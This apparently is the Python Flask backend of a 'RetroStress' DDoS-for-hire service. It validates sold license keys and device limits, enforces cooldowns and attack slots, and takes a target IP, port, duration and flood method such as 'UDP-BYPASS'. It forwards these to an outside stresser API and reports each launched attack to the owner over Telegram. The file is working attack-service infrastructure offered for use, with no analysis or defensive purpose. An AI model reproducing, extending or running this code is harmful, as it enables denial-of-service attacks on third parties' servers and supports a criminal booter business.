from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import time
import os
import threading
import gc
import re
from datetime import datetime
from pymongo import MongoClient
from dotenv import load_dotenv
import telebot

load_dotenv()

app = Flask(__name__)
CORS(app)

# ========== FORCE LOGGING ==========
def log(msg, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{level}][{timestamp}] {msg}", flush=True)

# ========== READ FROM ENVIRONMENT VARIABLES ==========
RETROSTRESS_API_URL = os.environ.get('RETROSTRESS_API_URL')
RETROSTRESS_API_KEY = os.environ.get('RETROSTRESS_API_KEY')
MONGODB_URI = os.environ.get('MONGODB_URI')
DATABASE_NAME = os.environ.get('DATABASE_NAME')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
OWNER_ID = int(os.environ.get('OWNER_ID', 0))

if not RETROSTRESS_API_URL:
    log("❌ ERROR: RETROSTRESS_API_URL not set!", "ERROR")
    exit(1)

if not RETROSTRESS_API_KEY:
    log("❌ ERROR: RETROSTRESS_API_KEY not set!", "ERROR")
    exit(1)

if not MONGODB_URI:
    log("❌ ERROR: MONGODB_URI not set!", "ERROR")
    exit(1)

log(f"📋 RetroStress API URL: {RETROSTRESS_API_URL}")

# Initialize Bot for notifications
bot = None
if BOT_TOKEN:
    try:
        bot = telebot.TeleBot(BOT_TOKEN)
        log("✅ Notification Bot initialized")
    except Exception as e:
        log(f"⚠️ Failed to initialize notification bot: {e}", "WARNING")

def send_owner_alert(msg):
    if bot and OWNER_ID:
        try:
            bot.send_message(OWNER_ID, msg, parse_mode="Markdown")
        except Exception as e:
            log(f"⚠️ Failed to send owner alert: {e}", "WARNING")

# ========== MONGODB CONNECTION ==========
try:
    client = MongoClient(MONGODB_URI, serverSelectionTimeoutMS=5000)
    client.admin.command('ping')
    db = client[DATABASE_NAME]
    keys_collection = db.keys
    active_sessions_collection = db.active_sessions
    settings_collection = db.settings
    log("✅ MongoDB connected successfully!")
except Exception as e:
    log(f"❌ MongoDB connection failed: {e}", "ERROR")
    exit(1)

# ========== START TELEGRAM BOT IN BACKGROUND ==========
def run_telegram_bot():
    """Run telegram_bot.py"""
    import subprocess
    import sys
    while True:
        try:
            log("🤖 Starting Telegram Bot...")
            subprocess.run([sys.executable, 'telegram_bot.py'], check=True)
        except Exception as e:
            log(f"❌ Telegram Bot crashed: {e}. Restarting in 5 seconds...", "ERROR")
            time.sleep(5)

bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
bot_thread.start()
log("✅ Telegram Bot thread started")

# ========== SETTINGS MANAGEMENT ==========
MIN_ATTACK_TIME = 1

def get_setting(setting_key, default_value):
    try:
        setting = settings_collection.find_one({"setting_key": setting_key})
        if setting:
            return setting.get("setting_value", default_value)
    except Exception as e:
        log(f"⚠️ Failed to get setting {setting_key}: {e}", "WARNING")
    return default_value

def get_max_duration():
    return get_setting("max_duration", 300)

def get_cooldown_seconds():
    return 40

# ========== SERVER IP ==========
def get_server_ip():
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text.strip()
        return ip if ip else "Unknown"
    except:
        try:
            ip = requests.get('https://ifconfig.me', timeout=5).text.strip()
            return ip if ip else "Unknown"
        except:
            return "Unknown"

# ========== IN-MEMORY STORAGE WITH LOCKS ==========
cooldowns = {}
active_attacks = {}
cooldowns_lock = threading.Lock()
active_attacks_lock = threading.Lock()

def verify_key(key, device_id):
    try:
        key_data = keys_collection.find_one({"key": key})
        
        if not key_data:
            return {"valid": False, "reason": "no key exist"}
            
        if key_data.get('is_active', 0) == 0:
            return {"valid": False, "reason": "key blocked"}
            
        if not key_data.get('is_redeemed', 0):
            return {"valid": False, "reason": "redeem key first in bot"}
        
        expiry_ts = key_data.get('expiry_at', 0)
        device_limit = key_data.get('device_limit', 1)
        now = int(time.time() * 1000)
        
        if expiry_ts < now:
            return {"valid": False, "reason": "expired key"}
        
        session = active_sessions_collection.find_one({"key": key})
        current_devices = session.get('devices', {}) if session else {}
        active_count = len(current_devices) if isinstance(current_devices, dict) else 0
        
        if device_id not in current_devices:
            if active_count >= device_limit:
                return {"valid": False, "reason": "max device reached"}
        
        if not session:
            active_sessions_collection.insert_one({
                "key": key,
                "devices": {device_id: {"login_time": now, "last_active": now}}
            })
        else:
            devices = session.get('devices', {})
            devices[device_id] = {"login_time": now, "last_active": now}
            active_sessions_collection.update_one(
                {"key": key},
                {"$set": {"devices": devices}}
            )
        
        if key_data.get('is_used') == 0:
            keys_collection.update_one(
                {"key": key},
                {"$set": {"is_used": 1, "used_by": device_id, "used_at": now}}
            )
        
        return {"valid": True, "expiry": expiry_ts}
        
    except Exception as e:
        log(f"❌ verify_key error: {e}", "ERROR")
        return {"valid": False, "reason": "Internal verification error"}

def check_cooldown(device_id):
    try:
        cooldown_seconds = get_cooldown_seconds()
        if cooldown_seconds == 0:
            return {"can_attack": True}
        
        now = time.time()
        with cooldowns_lock:
            if device_id in cooldowns:
                expiry = cooldowns[device_id]
                if isinstance(expiry, (int, float)) and now < expiry:
                    remaining = int(expiry - now)
                    return {"can_attack": False, "remaining": remaining}
                elif not isinstance(expiry, (int, float)):
                    del cooldowns[device_id]
        return {"can_attack": True}
    except Exception as e:
        log(f"⚠️ check_cooldown error: {e}", "WARNING")
        return {"can_attack": True}

def set_cooldown(device_id):
    try:
        cooldown_seconds = get_cooldown_seconds()
        if cooldown_seconds > 0:
            with cooldowns_lock:
                cooldowns[device_id] = time.time() + cooldown_seconds
    except Exception as e:
        log(f"⚠️ set_cooldown error: {e}", "WARNING")

def check_active_attack(device_id):
    try:
        with active_attacks_lock:
            now = time.time()
            # Count active attacks across all devices (data is now a dict)
            active_count = sum(1 for data in active_attacks.values() if isinstance(data, dict) and data.get("expiry", 0) > now)
            if active_count >= 6:
                return {"can_attack": False}
        return {"can_attack": True}
    except Exception as e:
        log(f"⚠️ check_active_attack error: {e}", "WARNING")
        return {"can_attack": True}

def start_attack(device_id, duration, ip, port):
    try:
        # Use a unique key for each attack so we can track multiple attacks
        attack_id = f"{device_id}_{int(time.time()*1000)}"
        with active_attacks_lock:
            active_attacks[attack_id] = {
                "expiry": time.time() + duration,
                "ip": ip,
                "port": port
            }
        
        def cleanup():
            try:
                time.sleep(duration)
                with active_attacks_lock:
                    if attack_id in active_attacks:
                        del active_attacks[attack_id]
            except Exception as e:
                log(f"⚠️ cleanup error: {e}", "WARNING")
        
        threading.Thread(target=cleanup, daemon=True).start()
    except Exception as e:
        log(f"⚠️ start_attack error: {e}", "WARNING")

# ========== PERIODIC CLEANUP ==========
def cleanup_memory():
    while True:
        try:
            time.sleep(30)
            now = time.time()
            cleaned_count = 0
            
            with cooldowns_lock:
                expired_cooldowns = [did for did, expiry in cooldowns.items() 
                                    if isinstance(expiry, (int, float)) and expiry <= now]
                for did in expired_cooldowns:
                    del cooldowns[did]
                    cleaned_count += 1
            
            with active_attacks_lock:
                expired_attacks = [aid for aid, data in active_attacks.items()
                                  if isinstance(data, dict) and data.get("expiry", 0) <= now]
                for aid in expired_attacks:
                    del active_attacks[aid]
                    cleaned_count += 1
            
            if cleaned_count > 0:
                log(f"🧹 Cleaned {cleaned_count} expired entries")
            
            gc.collect()
                    
        except Exception as e:
            log(f"⚠️ Cleanup error: {e}", "WARNING")

cleanup_thread = threading.Thread(target=cleanup_memory, daemon=True)
cleanup_thread.start()
log("✅ Cleanup thread started")

# ========== AFTER REQUEST CLEANUP ==========
@app.after_request
def after_request(response):
    gc.collect()
    return response

# ========== API ENDPOINTS ==========

@app.route('/')
def home():
    return jsonify({
        "status": "online",
        "service": "RetroStress API Server",
        "endpoints": [
            "/api/verify-key",
            "/api/attack",
            "/api/logout",
            "/api/settings",
            "/api/rules",
            "/api/ip",
            "/health"
        ]
    }), 200

@app.route('/health')
def health():
    return "OK", 200

@app.route('/api/verify-key', methods=['POST'])
def verify_key_endpoint():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"success": False, "reason": "Invalid JSON"}), 400
        
        key = data.get('key')
        device_id = data.get('device_id')
        
        result = verify_key(key, device_id)
        
        if result["valid"]:
            return jsonify({"success": True, "expiry": result["expiry"]})
        else:
            return jsonify({"success": False, "reason": result["reason"]}), 401
    except Exception as e:
        log(f"❌ Verify error: {e}", "ERROR")
        return jsonify({"success": False, "reason": str(e)}), 500

@app.route('/api/attack', methods=['POST'])
def attack_endpoint():
    start_time = time.time()
    
    try:
        data = request.get_json()
        if not data:
            return jsonify({"success": False, "reason": "Invalid JSON"}), 400
        
        key = data.get('key')
        device_id = data.get('device_id')
        ip = data.get('ip')
        port = data.get('port')
        duration = data.get('duration')
        method = data.get('method', 'UDP-BYPASS')
        
        device_id_short = device_id[:8] if device_id else "unknown"
        log(f"🔵 Attack - Device: {device_id_short}... | Target: {ip}:{port} | Duration: {duration}s | Method: {method}")
        
        if not all([key, device_id, ip, port, duration]):
            return jsonify({"success": False, "reason": "Missing parameters"}), 400
        
        try:
            duration = int(duration)
            max_duration = get_max_duration()
            if duration < MIN_ATTACK_TIME or duration > max_duration:
                return jsonify({"success": False, "reason": f"Duration must be {MIN_ATTACK_TIME}-{max_duration} seconds"}), 400
        except:
            return jsonify({"success": False, "reason": "Invalid duration"}), 400
        
        # Validate IP
        parts = ip.split('.')
        if len(parts) != 4:
            return jsonify({"success": False, "reason": "Invalid IP address"}), 400
        for part in parts:
            if not part.isdigit() or int(part) < 0 or int(part) > 255:
                return jsonify({"success": False, "reason": "Invalid IP address"}), 400
        
        # Validate port
        try:
            port = int(port)
            if port < 1 or port > 65535:
                return jsonify({"success": False, "reason": "Port must be 1-65535"}), 400
        except:
            return jsonify({"success": False, "reason": "Invalid port"}), 400
        
        # Verify key
        key_result = verify_key(key, device_id)
        if not key_result["valid"]:
            log(f"❌ Key verification failed: {key_result['reason']}")
            return jsonify({"success": False, "reason": key_result["reason"]}), 401
        
        # Check active slots (Max 6)
        if not check_active_attack(device_id)["can_attack"]:
            log(f"❌ Slots full (6/6)")
            return jsonify({"success": False, "reason": "All attack slots are full. Please wait."}), 429
        
        # Check cooldown
        cooldown_check = check_cooldown(device_id)
        if not cooldown_check["can_attack"]:
            remaining = cooldown_check.get('remaining', 0)
            log(f"❌ Cooldown active: {remaining}s remaining")
            return jsonify({"success": False, "reason": f"Cooldown: Wait {remaining} seconds"}), 429
        
        try:
            # Call RetroStress API
            url = RETROSTRESS_API_URL
            
            # Check if URL is a template with placeholders
            if "[target]" in url or "[port]" in url or "[time]" in url:
                log("ℹ️ URL appears to be a template. Replacing placeholders.")
                url = url.replace("[target]", ip)\
                         .replace("[port]", str(port))\
                         .replace("[time]", str(duration))\
                         .replace("[method]", method)
                
                if "key=0" in url and RETROSTRESS_API_KEY:
                    url = url.replace("key=0", f"key={RETROSTRESS_API_KEY}")
                    
                log(f"🔵 Calling RetroStress API: {url}")
                response = requests.get(url, timeout=30)
            else:
                # Fallback to standard params if no placeholders
                params = {
                    "key": RETROSTRESS_API_KEY,
                    "host": ip, # Use host instead of target as indicated by template
                    "port": port,
                    "time": duration,
                    "method": method,
                    "concurrent": 1
                }
                log(f"🔵 Calling RetroStress API: {RETROSTRESS_API_URL} with params")
                response = requests.get(RETROSTRESS_API_URL, params=params, timeout=30)
            elapsed = time.time() - start_time
            
            # Check if response is actually successful
            is_success = False
            api_res_text = response.text[:1000].replace('`', '')
            
            if response.status_code in [200, 201]:
                # Some APIs return 200 even on error, check response body
                error_keywords = ["error", "failed", "denied", "invalid", "limit reached", "balance"]
                if not any(keyword in api_res_text.lower() for keyword in error_keywords):
                    is_success = True
            
            if is_success:
                start_attack(device_id, duration, ip, port)
                set_cooldown(device_id)
                log(f"✅ Attack SUCCESS | Time: {elapsed:.2f}s")
                
                # Optional: log success to owner too if needed
                # Extract links for success too
                links = re.findall(r'(https?://[^\s<>"]+|www\.[^\s<>"]+)', api_res_text)
                link_text = "\n🔗 **Links Found:**\n" + "\n".join([f"• {l}" for l in links]) if links else ""
                
                send_owner_alert(f"ℹ️ **Attack Launched (APK)**\n👤 Device: `{device_id_short}...`\n🎯 Target: `{ip}:{port}`\n⏱️ Duration: `{duration}s`\n📝 API Response: `{api_res_text}`{link_text}")
                
                return jsonify({
                    "success": True, 
                    "message": f"💥 Attack started on {ip}:{port} for {duration} seconds",
                    "duration": duration
                }), 200
            else:
                log(f"❌ API Error Detected | Status: {response.status_code}")
                log(f"   Response: {api_res_text[:200]}")
                
                # Extract any links from response
                links = re.findall(r'(https?://[^\s<>"]+|www\.[^\s<>"]+)', api_res_text)
                link_text = "\n🔗 **Links Found:**\n" + "\n".join([f"• {l}" for l in links]) if links else ""
                
                send_owner_alert(f"⚠️ **API Request Failed (APK)**\n\n👤 Device: `{device_id_short}...`\n🎯 Target: `{ip}:{port}`\n⏱️ Duration: `{duration}s`\n🚫 Status: `{response.status_code}`\n\n📝 **Response:**\n`{api_res_text}`{link_text}")
                
                return jsonify({"success": False, "reason": f"API error: {response.status_code}"}), response.status_code
                
        except requests.exceptions.Timeout:
            elapsed = time.time() - start_time
            log(f"⏰ API TIMEOUT after {elapsed:.2f}s", "ERROR")
            send_owner_alert(f"⏰ **API Timeout (APK)**\n\nTarget: `{ip}:{port}`\nDuration: `{duration}s`")
            return jsonify({"success": False, "reason": "API timeout"}), 504
            
        except requests.exceptions.ConnectionError as e:
            elapsed = time.time() - start_time
            log(f"🔌 API CONNECTION ERROR after {elapsed:.2f}s: {e}", "ERROR")
            send_owner_alert(f"🔌 **API Connection Error (APK)**\n\nTarget: `{ip}:{port}`\nError: `{str(e)}`")
            return jsonify({"success": False, "reason": "Cannot connect to API"}), 503
            
        except Exception as e:
            elapsed = time.time() - start_time
            log(f"💥 UNEXPECTED ERROR after {elapsed:.2f}s: {type(e).__name__}: {e}", "ERROR")
            import traceback
            traceback_print = traceback.format_exc()
            print(traceback_print)
            
            send_owner_alert(f"🚨 **Critical Server Error**\n\nDevice: `{device_id_short}...`\nError: `{str(e)}`\nTraceback: ```\n{traceback_print[:500]}\n```")
            
            return jsonify({"success": False, "reason": "Internal server error"}), 500

@app.route('/api/logout', methods=['POST'])
def logout_endpoint():
    try:
        data = request.get_json()
        key = data.get('key')
        device_id = data.get('device_id')
        
        session = active_sessions_collection.find_one({"key": key})
        if session:
            devices = session.get('devices', {})
            if device_id and device_id in devices:
                del devices[device_id]
                if devices:
                    active_sessions_collection.update_one(
                        {"key": key},
                        {"$set": {"devices": devices}}
                    )
                else:
                    active_sessions_collection.delete_one({"key": key})
        
        return jsonify({"success": True})
    except Exception as e:
        log(f"❌ Logout error: {e}", "ERROR")
        return jsonify({"success": False, "reason": str(e)}), 500

@app.route('/api/settings', methods=['GET'])
def get_settings_endpoint():
    """Endpoint for APK to get attack settings"""
    return jsonify({
        "min_attack": MIN_ATTACK_TIME,
        "max_attack": get_max_duration(),
        "cooldown": get_cooldown_seconds()
    })

@app.route('/api/rules', methods=['GET'])
def rules_endpoint():
    """Endpoint for APK to get attack rules"""
    return jsonify({
        "min_attack": MIN_ATTACK_TIME,
        "max_attack": get_max_duration(),
        "cooldown": get_cooldown_seconds(),
        "status": "online"
    })

@app.route('/api/check-update', methods=['GET'])
def check_update_endpoint():
    """Endpoint for APK to check for updates"""
    try:
        version_setting = settings_collection.find_one({"setting_key": "latest_version"})
        url_setting = settings_collection.find_one({"setting_key": "apk_download_url"})
        
        latest_version = version_setting.get("setting_value", "1.0") if version_setting else "1.0"
        download_url = url_setting.get("setting_value", "/static/app-release.apk") if url_setting else "/static/app-release.apk"
        
        return jsonify({
            "success": True,
            "latest_version": latest_version,
            "download_url": download_url
        })
    except Exception as e:
        log(f"❌ Check update error: {e}", "ERROR")
        return jsonify({"success": False, "reason": str(e)}), 500

@app.route('/api/ip', methods=['GET'])
def get_ip_endpoint():
    ip = get_server_ip()
    return jsonify({
        "server_ip": ip,
        "status": "online",
        "timestamp": int(time.time())
    })

@app.route('/api/active-attacks', methods=['GET'])
def get_active_attacks():
    try:
        with active_attacks_lock:
            now = time.time()
            attacks = []
            for aid, data in active_attacks.items():
                if isinstance(data, dict):
                    expiry = data.get("expiry", 0)
                    if expiry > now:
                        attacks.append({
                            "ip": data.get("ip"),
                            "port": data.get("port"),
                            "remaining": int(expiry - now)
                        })
            return jsonify({"success": True, "attacks": attacks})
    except Exception as e:
        log(f"❌ get_active_attacks error: {e}", "ERROR")
        return jsonify({"success": False, "reason": str(e)}), 500

# ========== START SERVER (when run directly) ==========
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    server_ip = get_server_ip()
    print("=" * 60)
    print("⚡ RETROSTRESS API SERVER STARTING...")
    print("=" * 60)
    print(f"🖥️ Server IP: {server_ip}")
    print(f"🎯 RetroStress API: {RETROSTRESS_API_URL}")
    print(f"🔑 API Key: {RETROSTRESS_API_KEY[:10]}...")
    print(f"⚙️ Attack Range: {MIN_ATTACK_TIME}-{get_max_duration()} seconds")
    print(f"⏳ Cooldown: {get_cooldown_seconds()} seconds per user")
    print(f"📡 Endpoints: /api/settings, /api/rules, /api/attack, /api/verify-key")
    print("=" * 60)
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)